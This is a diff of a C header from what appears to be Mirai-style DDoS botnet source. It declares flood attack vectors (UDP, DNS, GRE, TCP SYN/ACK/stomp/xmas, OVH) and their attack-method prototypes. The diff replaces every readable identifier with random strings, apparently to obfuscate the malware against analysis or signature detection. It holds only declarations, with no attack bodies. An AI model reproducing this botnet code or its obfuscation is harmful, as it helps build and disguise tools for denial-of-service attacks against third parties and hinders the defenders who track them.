@@ -7,17 +7,17 @@
 #include "includes.h"
 #include "protocol.h"
 #define ATTACK_CONCURRENT_MAX   15
-struct attack_target {
+struct _Lw2SW5p {
     struct sockaddr_in sock_addr;
     ipv4_t addr;
     uint8_t netmask;
 };
-struct attack_option {
+struct _ak3Jy6Y {
     char *val;
     uint8_t key;
 };
-typedef void (*ATTACK_FUNC) (uint8_t, struct attack_target *, uint8_t, struct attack_option *);
-typedef uint8_t ATTACK_VECTOR;
+typedef void (*_hA2DK2q) (uint8_t, struct _Lw2SW5p *, uint8_t, struct _ak3Jy6Y *);
+typedef uint8_t _Am6qv4K;
 #define ATK_VEC_UDP        0
 #define ATK_VEC_VSE        1
 #define ATK_VEC_DNS        2
@@ -54,11 +54,11 @@ typedef uint8_t ATTACK_VECTOR;
 #define ATK_OPT_ACKRND          18
 #define ATK_OPT_GRE_CONSTIP     19
 #define ATK_OPT_SOURCE          25
-struct attack_method {
-    ATTACK_FUNC func;
-    ATTACK_VECTOR vector;
+struct _jh5Ek6N {
+    _hA2DK2q func;
+    _Am6qv4K vector;
 };
-struct attack_stomp_data {
+struct _jF5vX4i {
     ipv4_t addr;
     uint32_t seq, ack_seq;
     port_t sport, dport;
@@ -68,28 +68,28 @@ struct attack_xmas_data {
     uint32_t seq, ack_seq;
     port_t sport, dport;
 };
-BOOL attack_init(void);
-void attack_kill_all(void);
-void attack_parse(char *, int);
-void attack_start(int, ATTACK_VECTOR, uint8_t, struct attack_target *, uint8_t, struct attack_option *);
-char *attack_get_opt_str(uint8_t, struct attack_option *, uint8_t, char *);
-int attack_get_opt_int(uint8_t, struct attack_option *, uint8_t, int);
-uint32_t attack_get_opt_ip(uint8_t, struct attack_option *, uint8_t, uint32_t);
-void attack_method_udpgeneric(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
-void attack_method_udpvse(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
-void attack_method_udpdns(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
-void attack_method_udpplain(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
-void attack_method_tcpsyn(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
-void attack_method_tcpack(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
-void attack_method_tcpstomp(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
-void attack_method_tcpxmas(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
-void attack_method_greip(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
-void attack_method_greeth(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
-void attack_method_std(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
-void attack_method_tcpusyn(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
-void attack_method_tcpall(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
-void attack_method_tcpfrag(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
-void attack_method_asyn(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
-void attack_method_ovh(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
-static void add_attack(ATTACK_VECTOR, ATTACK_FUNC);
-static void free_opts(struct attack_option *, int);
+BOOL Hu6uf7y(void);
+void UV8wo4a(void);
+void dz4NW6v(char *, int);
+void nu5hm7Y(int, _Am6qv4K, uint8_t, struct _Lw2SW5p *, uint8_t, struct _ak3Jy6Y *);
+char *Gm8Th7P(uint8_t, struct _ak3Jy6Y *, uint8_t, char *);
+int Cn6pZ7t(uint8_t, struct _ak3Jy6Y *, uint8_t, int);
+uint32_t qM3bi3n(uint8_t, struct _ak3Jy6Y *, uint8_t, uint32_t);
+void Tv3eT5t(uint8_t, struct _Lw2SW5p *, uint8_t, struct _ak3Jy6Y *);
+void gb2ob7U(uint8_t, struct _Lw2SW5p *, uint8_t, struct _ak3Jy6Y *);
+void Fq5Mk7Y(uint8_t, struct _Lw2SW5p *, uint8_t, struct _ak3Jy6Y *);
+void bx3we8X(uint8_t, struct _Lw2SW5p *, uint8_t, struct _ak3Jy6Y *);
+void zH8AM3C(uint8_t, struct _Lw2SW5p *, uint8_t, struct _ak3Jy6Y *);
+void gj7Ru2o(uint8_t, struct _Lw2SW5p *, uint8_t, struct _ak3Jy6Y *);
+void Jr5JL6d(uint8_t, struct _Lw2SW5p *, uint8_t, struct _ak3Jy6Y *);
+void Tn8aH6f(uint8_t, struct _Lw2SW5p *, uint8_t, struct _ak3Jy6Y *);
+void aP5Kp4u(uint8_t, struct _Lw2SW5p *, uint8_t, struct _ak3Jy6Y *);
+void yQ6Ut4X(uint8_t, struct _Lw2SW5p *, uint8_t, struct _ak3Jy6Y *);
+void jG6oM6K(uint8_t, struct _Lw2SW5p *, uint8_t, struct _ak3Jy6Y *);
+void EA6XQ6C(uint8_t, struct _Lw2SW5p *, uint8_t, struct _ak3Jy6Y *);
+void Hs2Ny8u(uint8_t, struct _Lw2SW5p *, uint8_t, struct _ak3Jy6Y *);
+void as6WA6q(uint8_t, struct _Lw2SW5p *, uint8_t, struct _ak3Jy6Y *);
+void Db5Ym3u(uint8_t, struct _Lw2SW5p *, uint8_t, struct _ak3Jy6Y *);
+void hF5fe6z(uint8_t, struct _Lw2SW5p *, uint8_t, struct _ak3Jy6Y *);
+static void wv2aC8v(_Am6qv4K, _hA2DK2q);
+static void tU2kY3C(struct _ak3Jy6Y *, int);
